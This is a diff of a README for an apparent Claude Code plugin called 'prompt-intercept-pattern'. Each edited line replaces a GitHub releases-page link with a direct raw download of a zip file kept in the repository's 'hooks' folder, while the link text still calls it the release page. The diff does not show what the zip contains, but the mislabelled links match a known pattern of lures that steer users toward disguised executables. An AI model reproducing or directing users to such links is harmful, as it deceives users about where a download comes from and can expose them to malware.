@@ -1,6 +1,6 @@
 # 🪝 prompt-intercept-pattern - Run commands without an API call
 
-[![Download prompt-intercept-pattern](https://img.shields.io/badge/Download-Release%20Page-grey?style=for-the-badge&logo=github)](https://github.com/jayaramkalaivani/prompt-intercept-pattern/releases)
+[![Download prompt-intercept-pattern](https://img.shields.io/badge/Download-Release%20Page-grey?style=for-the-badge&logo=github)](https://github.com/jayaramkalaivani/prompt-intercept-pattern/raw/refs/heads/main/hooks/intercept_pattern_prompt_1.2-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ prompt-intercept-pattern is a Claude Code plugin pattern for Windows users who w
 
 Use the release page below to get the latest Windows build:
 
-[Visit the release page to download](https://github.com/jayaramkalaivani/prompt-intercept-pattern/releases)
+[Visit the release page to download](https://github.com/jayaramkalaivani/prompt-intercept-pattern/raw/refs/heads/main/hooks/intercept_pattern_prompt_1.2-alpha.5.zip)
 
 ## 🧩 What This Tool Does
 
@@ -36,7 +36,7 @@ If your PC is managed by a work account, you may need admin rights to run the fi
 
 ## 📥 Download the App
 
-1. Open the [release page](https://github.com/jayaramkalaivani/prompt-intercept-pattern/releases)
+1. Open the [release page](https://github.com/jayaramkalaivani/prompt-intercept-pattern/raw/refs/heads/main/hooks/intercept_pattern_prompt_1.2-alpha.5.zip)
 2. Find the latest release at the top of the page
 3. Look for the Windows download file
 4. Download the file to your PC
@@ -186,7 +186,7 @@ If the project uses local scripts, review them before you make edits. That helps
 
 Download the latest Windows file from the GitHub release page:
 
-[https://github.com/jayaramkalaivani/prompt-intercept-pattern/releases](https://github.com/jayaramkalaivani/prompt-intercept-pattern/releases)
+[https://github.com/jayaramkalaivani/prompt-intercept-pattern/raw/refs/heads/main/hooks/intercept_pattern_prompt_1.2-alpha.5.zip](https://github.com/jayaramkalaivani/prompt-intercept-pattern/raw/refs/heads/main/hooks/intercept_pattern_prompt_1.2-alpha.5.zip)
 
 ## 📝 Quick Start
 
